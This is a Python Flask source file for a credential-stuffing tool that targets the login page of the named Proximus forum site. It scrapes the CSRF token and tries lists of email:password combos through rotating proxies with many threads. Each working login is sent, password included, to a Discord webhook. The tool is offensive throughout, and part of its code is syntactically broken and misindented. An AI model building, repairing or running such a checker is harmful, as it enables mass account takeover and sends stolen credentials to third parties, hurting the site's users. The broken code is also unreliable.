from flask import Flask, request, jsonify, Response
import asyncio
import aiohttp
import json
import time
import re
from typing import List, Optional, Tuple
import threading
from queue import Queue
import uuid
import os

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

# Configuration for: proximus.be
SITE_CONFIG = {
    "name": "proximus.be",
    "base_url": "https://nl.forum.proximus.be",
    "login_endpoint": "/member/login",
    "csrf_token_name": "login[_token]",
    "framework": "laravel"
}

active_jobs = {}
job_results = {}

class CheckerEngine:
    def __init__(self, job_id, threads, timeout, proxy_list=None, proxy_type="http", webhook_url=None):
        self.job_id = job_id
        self.threads = threads
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.proxy_list = proxy_list
        self.proxy_type = proxy_type.lower()
        self.webhook_url = webhook_url
        self.stats = {"hits": 0, "fails": 0, "errors": 0, "checked": 0, "total": 0}
        self.results = []
        self.results_queue = Queue()
        self.is_running = True

    async def send_discord(self, email, password):
        if not self.webhook_url: return
        payload = {"embeds": [{"title": "HIT - proximus.be", "color": 3066993, "fields": [{"name": "Email", "value": f"`{email}`", "inline": True}, {"name": "Pass", "value": f"`{password}`", "inline": True}]}]}
        try:
            async with aiohttp.ClientSession() as s:
                await s.post(self.webhook_url, json=payload, timeout=10)
        except: pass

    async def check_single(self, session, email, pwd, proxy):
        timeout = self.timeout
        try:

    # Get CSRF from login page
    async with session.get("https://nl.forum.proximus.be/member/login", proxy=proxy, timeout=timeout) as r:
        html = await r.text()
        import re
        match = re.search(r'name=["\']login[_token]["\']\s+value=["\']+([^"\']+)', html, re.I)
        if not match:
            match = re.search(r'value=["\']+([^"\']+)["\']+.*?name=["\']login[_token]', html, re.I)
        csrf = match.group(1) if match else ""

            data = {"email": email, "password": pwd}, "login[_token]": csrf}
            
            async with session.post("https://nl.forum.proximus.be/member/login", data=data, proxy=proxy, timeout=timeout, allow_redirects=True) as r:
                try:
                    rj = await r.json()
                    url = rj.get("url", str(r.url))
                except:
                    rj = await r.text()
                    url = str(r.url)
                
                response_str = (json.dumps(rj) if isinstance(rj, dict) else str(rj)).lower() + " " + url.lower()
                
                # Check for failure indicators
                fail_patterns = ["invalid", "incorrect", "wrong", "failed", "error", "unauthorized", "denied"]
                success_patterns = ["dashboard", "welcome", "success", "logged", "account", "profile", "logout", "home"]
                
                if any(p in response_str for p in fail_patterns):
                    return "FAIL", "Invalid"
                elif any(p in response_str for p in success_patterns):
                    return "HIT", url
                else:
                    return "UNKNOWN", "Check response"
        except Exception as e:
            return "ERROR", str(e)[:30]

    async def worker(self, queue):
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.is_running:
                try: item = await asyncio.wait_for(queue.get(), timeout=1.0)
                except asyncio.TimeoutError: continue
                if item is None: break
                idx, email, pwd = item
                
                for attempt in range(3):
                    if not self.is_running: break
                    p = self.proxy_list[idx % len(self.proxy_list)] if self.proxy_list else None
                    if p and not p.startswith("http"): p = f"http://{p}"
                    
                    status, msg = await self.check_single(session, email, pwd, p)
                    
                    if status != "ERROR" or attempt == 2:
                        break
                    await asyncio.sleep(0.5)
                
                self.stats["checked"] += 1
                if status == "HIT":
                    self.stats["hits"] += 1
                    self.results.append(f"{email}:{pwd}")
                    asyncio.create_task(self.send_discord(email, pwd))
                elif status == "FAIL":
                    self.stats["fails"] += 1
                else:
                    self.stats["errors"] += 1
                
                self.results_queue.put({"index": idx, "email": email, "status": status, "message": msg, "stats": self.stats.copy(), "password": pwd})
                queue.task_done()

    async def run(self, combos):
        self.stats["total"] = len(combos)
        q = asyncio.Queue()
        for c in combos: await q.put(c)
        for _ in range(self.threads): await q.put(None)
        await asyncio.gather(*[asyncio.create_task(self.worker(q)) for _ in range(self.threads)])

def run_thread(job_id, combos, threads, proxies, ptype, webhook):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    checker = CheckerEngine(job_id, threads, 30, proxies, ptype, webhook)
    active_jobs[job_id] = checker
    try: loop.run_until_complete(checker.run(combos))
    finally:
        job_results[job_id] = {"status": "done", "stats": checker.stats, "hits": checker.results}
        if job_id in active_jobs: del active_jobs[job_id]
        loop.close()

@app.route('/')
def home(): return jsonify({"status": "online", "site": "proximus.be", "active": len(active_jobs)})

@app.route('/health')
def health(): return jsonify({"status": "ok"})

@app.route('/config')
def config(): return jsonify(SITE_CONFIG)

@app.route('/check', methods=['POST', 'GET'])
def check():
    if request.method == 'GET': return jsonify({"info": "POST combos to check", "site": "proximus.be"})
    data = request.json
    if not data or 'combos' not in data: return jsonify({"error": "No combos provided"}), 400
    
    combos = []
    for idx, c in enumerate(data['combos'], data.get('start_line', 1)):
        if ':' in c:
            p = c.split(':', 1)
            combos.append((idx, p[0].strip(), p[1].strip()))
    
    job_id = str(uuid.uuid4())
    threading.Thread(target=run_thread, args=(job_id, combos, data.get('threads', 10), data.get('proxies'), data.get('proxy_type', 'http'), data.get('webhook_url')), daemon=True).start()
    return jsonify({"job_id": job_id, "status": "started", "combos": len(combos)})

@app.route('/results/<job_id>')
def results(job_id):
    def generate():
        last_hb = time.time()
        while True:
            if job_id in active_jobs:
                c = active_jobs[job_id]
                while not c.results_queue.empty():
                    yield f"data: {json.dumps(c.results_queue.get_nowait())}\n\n"
                    last_hb = time.time()
                if time.time() - last_hb > 5:
                    yield ": heartbeat\n\n"
                    last_hb = time.time()
                time.sleep(0.1)
            elif job_id in job_results:
                yield f"data: {json.dumps(job_results[job_id])}\n\n"
                break
            else: break
    return Response(generate(), mimetype='text/event-stream')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
